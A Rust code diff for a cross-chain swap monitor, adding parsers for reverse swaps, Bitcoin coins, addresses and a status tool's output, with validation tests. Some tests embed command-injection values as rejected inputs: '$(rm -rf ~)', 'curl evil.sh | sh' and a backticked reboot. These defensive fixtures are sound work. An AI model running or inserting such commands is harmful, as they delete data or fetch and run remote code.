@@ -3,7 +3,9 @@
 
 use crate::{
     fmt::short,
-    monitors::fast_bridge::model::{Ad, Asset, Capacity, Health, Identity, Level, LogEntry, Signal, Swap, Terms, Want, tac},
+    monitors::fast_bridge::model::{
+        Ad, Asset, Capacity, Coin, Direction, Health, Identity, Level, LogEntry, ReverseSide, ReverseStock, Signal, Swap, Terms, UNIT, Want, tac,
+    },
 };
 use serde_json::Value;
 
@@ -43,6 +45,18 @@ fn text(v: &Value, key: &str) -> String {
     v.get(key).and_then(Value::as_str).unwrap_or("").to_string()
 }
 
+/// A transaction id: 64 hex digits, lower case. These end up in commands the operator runs, so nothing else is kept.
+fn txid(v: &Value, key: &str) -> Option<String> {
+    let id = v.get(key)?.as_str()?;
+    (id.len() == 64 && id.bytes().all(|b| b.is_ascii_hexdigit())).then(|| id.to_ascii_lowercase())
+}
+
+/// A bech32 Bitcoin address, or `None`. These end up in commands too: the character set rules out anything a shell reads.
+pub fn btc_address(s: &str) -> Option<String> {
+    let hrp = ["bc1", "tb1", "bcrt1"].iter().any(|h| s.starts_with(h));
+    (hrp && (14..=90).contains(&s.len()) && s.bytes().all(|b| b.is_ascii_lowercase() || b.is_ascii_digit())).then(|| s.to_string())
+}
+
 /// `/info`, and the same fields in a board ad. `None` when the size range or the fee is not there to read:
 /// terms of all zeros would be drawn as real ones.
 pub fn terms(v: &Value) -> Option<Terms> {
@@ -65,6 +79,7 @@ pub fn health(v: &Value) -> Health {
 pub fn swap(v: &Value) -> Option<Swap> {
     let offer = v.get("offer")?;
     Some(Swap {
+        direction: Direction::Forward,
         id: text(v, "id"),
         phase: text(v, "phase"),
         created: small(v, "created"),
@@ -73,7 +88,48 @@ pub fn swap(v: &Value) -> Option<Swap> {
         pays: offer.get("btc")?.get("value").and_then(units)?,
         gets: offer.get("evm")?.get("amount").and_then(units)?,
         lock_txid: text(v, "lockTxid"),
+        take_txid: v.get("take").and_then(|t| txid(t, "txid")).unwrap_or_default(),
     })
+}
+
+/// A record in the provider's `reverse/swaps/`. The provider locks TAC on Bitcoin (`amount`) for the bridger's pool
+/// TAC (`evmAmount`). `None` without both amounts, as forward.
+pub fn reverse_swap(v: &Value) -> Option<Swap> {
+    Some(Swap {
+        direction: Direction::Reverse,
+        id: text(v, "id"),
+        phase: text(v, "phase"),
+        created: small(v, "created"),
+        // known once the bridger has offered its pool lock
+        deadline: v.get("evmOffer").map_or(0, |o| small(o, "deadline")),
+        pays: v.get("evmAmount").and_then(units)?,
+        gets: v.get("amount").and_then(units)?,
+        lock_txid: v.get("lock").map(|l| text(l, "txid")).unwrap_or_default(),
+        take_txid: String::new(),
+    })
+}
+
+/// `/reverse/info`. `None` for an answer without terms: it is a failed read, not a side with nothing to sell.
+pub fn reverse(v: &Value) -> Option<ReverseSide> {
+    Some(ReverseSide::On { terms: terms(v)?, open: v.get("open").and_then(units).map(|n| u64::try_from(n).unwrap_or(u64::MAX)), max_open: small(v, "maxOpen") })
+}
+
+/// An explorer's list of unspent outputs. An entry without a readable id, index or value is dropped: a coin
+/// that cannot be named cannot be put in a command.
+pub fn coins(v: &Value) -> Option<Vec<Coin>> {
+    let list = v.as_array()?;
+    Some(
+        list.iter()
+            .filter_map(|c| {
+                Some(Coin {
+                    txid: txid(c, "txid")?,
+                    vout: u32::try_from(c.get("vout")?.as_u64()?).ok()?,
+                    sats: c.get("value")?.as_u64()?,
+                    confirmed: c.get("status").and_then(|s| s.get("confirmed")).and_then(Value::as_bool).unwrap_or(false),
+                })
+            })
+            .collect(),
+    )
 }
 
 pub fn want(v: &Value) -> Want {
@@ -93,7 +149,31 @@ pub fn ad(v: &Value) -> Option<Ad> {
         terms: terms(v)?,
         any_tac: v.get("anyTac").and_then(Value::as_bool).unwrap_or(false),
         reverse: v.get("reverse").is_some_and(|r| !r.is_null() && r != &Value::Bool(false)),
+        reverse_terms: v.get("reverse").and_then(terms),
     })
+}
+
+/// "20", "2.5", "0.00000001" in TAC as base units. More than 8 places, or anything else, is `None`.
+fn decimal_tac(s: &str) -> Option<u128> {
+    let (whole, frac) = s.split_once('.').unwrap_or((s, ""));
+    if whole.is_empty() || frac.len() > 8 || !whole.bytes().chain(frac.bytes()).all(|b| b.is_ascii_digit()) {
+        return None;
+    }
+    whole.parse::<u128>().ok()?.checked_mul(UNIT)?.checked_add(format!("{frac:0<8}").parse::<u128>().ok()?)
+}
+
+/// What tacit's `fastbridge-lp-reverse-status.mjs` prints, which is not a stable interface: the three lines it is
+/// read from are found by their labels. `None` without the address or the TAC line: a run that stopped part way.
+pub fn reverse_stock(out: &str) -> Option<ReverseStock> {
+    let after = |label: &str| out.lines().find_map(|l| l.strip_prefix(label)).map(str::trim);
+    let address = btc_address(after("reverse address")?.split_whitespace().next()?)?;
+    // "1 confirmed note, 20 TAC in all  (+…)"
+    let mut tac_line = after("TAC at it")?.split_whitespace();
+    let notes = tac_line.next()?.parse().ok()?;
+    let tac = tac_line.skip_while(|w| !w.ends_with(',')).nth(1).and_then(decimal_tac)?;
+    // "1 confirmed coin, 30000 sats in all", or "could not be read from any explorer"
+    let sats = after("plain sats").and_then(|l| l.split_whitespace().skip_while(|w| !w.ends_with(',')).nth(1)?.parse().ok());
+    Some(ReverseStock { address, notes, tac, sats })
 }
 
 /// "2026-11-24T05:51:50.890Z" as seconds since 1970. UTC only, which is what the provider writes.
@@ -144,6 +224,7 @@ pub fn log_line(raw: &str) -> Option<LogEntry> {
             .and_then(units)
             .zip(v.get("promised").and_then(units))
             .map(|(held, promised)| Signal::Capacity(Capacity { held, promised, open: small(&v, "open"), holds: small(&v, "holds") })),
+        m if m.starts_with("the reverse side is on") => btc_address(&text(&v, "reverseAddress")).map(Signal::ReverseOn),
         _ => None,
     };
     let level = match text(&v, "level").as_str() {
@@ -197,6 +278,136 @@ mod tests {
         let s = swap(&record).expect("a swap");
 
         assert_eq!((s.pays, s.gets, s.fee(), s.closed()), (25_289_340_101, 24_900_000_000, 389_340_101, false));
+    }
+
+    #[test]
+    fn a_take_is_read_only_when_its_id_is_a_transaction_id() {
+        let offer = json!({ "btc": { "value": "2" }, "evm": { "amount": "1" } });
+        let id = "ABCD1234ABCD1234ABCD1234ABCD1234ABCD1234ABCD1234ABCD1234ABCD1234";
+        let records =
+            [json!({ "offer": offer, "take": { "txid": id } }), json!({ "offer": offer, "take": { "txid": "$(rm -rf ~)" } }), json!({ "offer": offer })];
+
+        let takes = records.each_ref().map(|r| swap(r).expect("a swap").take_txid);
+
+        assert_eq!(takes, [id.to_ascii_lowercase(), String::new(), String::new()]);
+    }
+
+    #[test]
+    fn coins_that_cannot_be_named_in_a_command_are_dropped() {
+        let id = "1234abcd1234abcd1234abcd1234abcd1234abcd1234abcd1234abcd1234abcd";
+        let listed = json!([
+            { "txid": id, "vout": 1, "value": 19500, "status": { "confirmed": true } },
+            { "txid": "a24f; curl evil.sh | sh", "vout": 0, "value": 50000, "status": { "confirmed": true } },
+            { "txid": id, "vout": 4294967296u64, "value": 1 },
+            { "txid": id, "vout": 2, "value": 546 },
+        ]);
+
+        let c = coins(&listed).expect("a list");
+
+        assert_eq!(
+            c.iter().map(|c| (c.outpoint(), c.sats, c.confirmed)).collect::<Vec<_>>(),
+            [(format!("{id}:1"), 19500, true), (format!("{id}:2"), 546, false)]
+        );
+    }
+
+    #[test]
+    fn only_a_plain_bech32_address_is_taken_from_the_log() {
+        let line =
+            |a: &str| format!(r#"{{"msg":"the reverse side is on: the TAC and the sats at this Bitcoin address are what it sells","reverseAddress":"{a}"}}"#);
+
+        let read = ["bc1qtestreverse00000000000000000000000000", "bc1q`reboot`", "1BoatSLRHtKNngkdXEeobR76b53LETtpyT"]
+            .map(|a| log_line(&line(a)).and_then(|e| e.signal));
+
+        assert!(matches!(&read[0], Some(Signal::ReverseOn(a)) if a == "bc1qtestreverse00000000000000000000000000"));
+        assert!(read[1].is_none() && read[2].is_none());
+    }
+
+    #[test]
+    fn reverse_info_without_terms_is_a_failed_read() {
+        let answers = [json!({ "minAmount": "1", "maxAmount": "9", "feeBps": 30, "available": "5", "open": 1, "maxOpen": 2 }), json!({ "available": "5" })];
+
+        let read = answers.each_ref().map(reverse);
+
+        assert!(matches!(&read[0], Some(ReverseSide::On { terms, open: Some(1), max_open: 2 }) if terms.available == Some(5)));
+        assert_eq!(read[1], None);
+    }
+
+    #[test]
+    fn a_reverse_record_reads_what_the_bridger_pays_in_the_pool_and_gets_on_bitcoin() {
+        let record = json!({
+            "role": "bl", "id": "cc33", "phase": "claiming", "created": 1795500342u64, "amount": "2000000000", "evmAmount": "2016000000",
+            "lock": { "txid": "dd44" }, "evmOffer": { "deadline": 1795515000u64 }
+        });
+
+        let s = reverse_swap(&record).expect("a swap");
+
+        assert_eq!(
+            (s.direction, s.pays, s.gets, s.fee(), s.deadline, s.lock_txid.as_str()),
+            (Direction::Reverse, 2_016_000_000, 2_000_000_000, 16_000_000, 1_795_515_000, "dd44")
+        );
+        assert!(!s.paid() && !s.closed());
+    }
+
+    #[test]
+    fn a_reverse_record_without_both_amounts_is_not_a_swap_and_one_not_yet_offered_has_no_deadline() {
+        let records = [json!({ "phase": "built", "amount": "5" }), json!({ "phase": "built", "amount": "5", "evmAmount": "6" })];
+
+        let read = records.each_ref().map(reverse_swap);
+
+        assert_eq!(read[0], None);
+        assert_eq!(read[1].as_ref().map(|s| s.deadline), Some(0));
+    }
+
+    #[test]
+    fn an_ads_reverse_terms_are_read_where_they_can_be() {
+        let ads = [
+            json!({ "minAmount": "1", "maxAmount": "9", "feeBps": 30, "reverse": { "minAmount": "2", "maxAmount": "8", "feeBps": 20, "available": "7" } }),
+            json!({ "minAmount": "1", "maxAmount": "9", "feeBps": 30, "reverse": { "note": "soon" } }),
+            json!({ "minAmount": "1", "maxAmount": "9", "feeBps": 30 }),
+        ];
+
+        let read = ads.each_ref().map(|a| ad(a).map(|a| (a.reverse, a.reverse_terms.map(|t| (t.fee_bps, t.available)))));
+
+        assert_eq!(read, [Some((true, Some((20, Some(7))))), Some((true, None)), Some((false, None))]);
+    }
+
+    const STATUS: &str = "main address      bc1qtestmain000000000000000000000000000000   (the provider's earnings)
+reverse address   bc1qtestreverse00000000000000000000000000   <- send plain sats here (an ordinary Bitcoin send)
+reverse tacit1    tacit1qtest000000000000000000000000000000000000000000000000000000
+
+TAC at it         2 confirmed notes, 20.12345678 TAC in all  (+1 not confirmed yet, or received privately and not moved yet: not counted)
+              20 TAC   9a9a9a9a9a9a…:0   546 sats
+
+plain sats        1 confirmed coin, 30000 sats in all
+";
+
+    #[test]
+    fn the_status_tools_output_is_read_by_its_labels() {
+        let out = STATUS;
+
+        let stock = reverse_stock(out).expect("a stock");
+
+        assert_eq!(stock, ReverseStock { address: "bc1qtestreverse00000000000000000000000000".into(), notes: 2, tac: 2_012_345_678, sats: Some(30_000) });
+    }
+
+    #[test]
+    fn a_status_run_that_stopped_part_way_or_lost_its_explorer_is_read_for_what_it_says() {
+        let cut = STATUS.split("TAC at it").next().expect("the head");
+        let no_sats = STATUS.replace("1 confirmed coin, 30000 sats in all", "could not be read from any explorer");
+
+        let (cut, no_sats) = (reverse_stock(cut), reverse_stock(&no_sats));
+
+        assert_eq!(cut, None);
+        assert_eq!(no_sats.map(|s| (s.tac, s.sats)), Some((2_012_345_678, None)));
+    }
+
+    #[test]
+    fn a_tac_figure_with_more_places_than_tac_has_is_not_rounded_into_one() {
+        let amounts = ["20", "0.5", "1.000000001", "1,000", "-1", ""];
+
+        let read = amounts.map(decimal_tac);
+
+        assert_eq!(read, [Some(20 * UNIT), Some(UNIT / 2), None, None, None, None]);
     }
 
     #[test]
